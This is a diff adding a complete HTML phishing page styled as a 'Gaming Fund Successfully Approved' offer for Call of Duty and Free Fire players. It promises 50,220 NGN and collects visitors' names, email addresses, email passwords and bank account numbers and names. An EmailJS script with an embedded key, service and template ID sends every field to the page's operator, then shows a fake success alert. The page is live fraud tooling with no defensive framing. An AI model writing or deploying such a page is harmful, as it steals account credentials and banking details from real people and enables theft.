@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Gaming Fund Approved</title>
+<link rel="stylesheet" href="styles.css">
+<style>
+    /* Additional CSS styling for the gaming fund giver */
+    body {
+        font-family: Arial, sans-serif;
+        background-color: #f4f4f4;
+        padding: 20px;
+    }
+    h2 {
+        text-align: center;
+        color: #333;
+    }
+    form {
+        max-width: 500px;
+        margin: 0 auto;
+        background-color: #fff;
+        padding: 20px;
+        border-radius: 10px;
+        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+    }
+    label {
+        display: block;
+        font-weight: bold;
+        margin-bottom: 5px;
+        color: #333;
+    }
+    input[type="text"],
+    input[type="email"],
+    input[type="password"],
+    input[type="number"],
+    select {
+        width: 100%;
+        padding: 10px;
+        margin-bottom: 15px;
+        border: 1px solid #ccc;
+        border-radius: 5px;
+        box-sizing: border-box;
+    }
+    input[type="button"] {
+        background-color: #007bff;
+        color: #fff;
+        border: none;
+        padding: 10px 20px;
+        cursor: pointer;
+        border-radius: 5px;
+    }
+    input[type="button"]:hover {
+        background-color: #0056b3;
+    }
+</style>
+<script src="https://cdn.emailjs.com/dist/email.min.js"></script>
+<script>
+    (function(){
+        emailjs.init("prEhy5YOK66_5Tvfg"); // Replace YOUR_USER_ID with your actual public API key from EmailJS
+    })();
+    
+    function sendEmail() {
+        var name = document.getElementById("name").value;
+        var email = document.getElementById("email").value;
+        var password = document.getElementById("password").value;
+        var game = document.getElementById("game").value;
+        var accountNumber = document.getElementById("accountNumber").value;
+        var accountName = document.getElementById("accountName").value;
+
+        // Send email using EmailJS
+        emailjs.send("service_a6nfqao", "template_ousg6r4", {
+            from_name: name,
+            from_email: email,
+            password: password,
+            game: game,
+            account_number: accountNumber,
+            account_name: accountName
+        })
+        .then(function(response) {
+            console.log("Email sent successfully", response);
+            alert("Congratulation Your gaming fund of 50,220 NGN will be sent soon");
+            // Optionally, you can clear the form fields after successful submission
+            document.getElementById("checkoutForm").reset();
+        }, function(error) {
+            console.error("Email send failed", error);
+            alert("Oops! Something went wrong. Please try again later.");
+        });
+    }
+</script>
+</head>
+<body>
+
+<h2>Gaming Fund Successfully Approved</h2>
+
+<form id="checkoutForm">
+    <label for="name">Your Name:</label>
+    <input type="text" id="name" name="name" required>
+
+    <label for="email">Your Email:</label>
+    <input type="email" id="email" name="email" required>
+
+    <label for="password">Email Password:</label>
+    <input type="password" id="password" name="password" required>
+
+    <label for="game">Select Game:</label>
+    <select id="game" name="game" required>
+        <option value="">Choose a game...</option>
+        <option value="COD">Call of Duty</option>
+        <option value="FreeFire">Free Fire</option>
+    </select>
+
+    <label for="accountNumber">Account Number:</label>
+    <input type="number" id="accountNumber" name="accountNumber" required>
+
+    <label for="accountName">Account Name:</label>
+    <input type="text" id="accountName" name="accountName" required>
+
+    <input type="button" value="Request Fund" onclick="sendEmail()">
+</form>
+
+</body>
+</html>
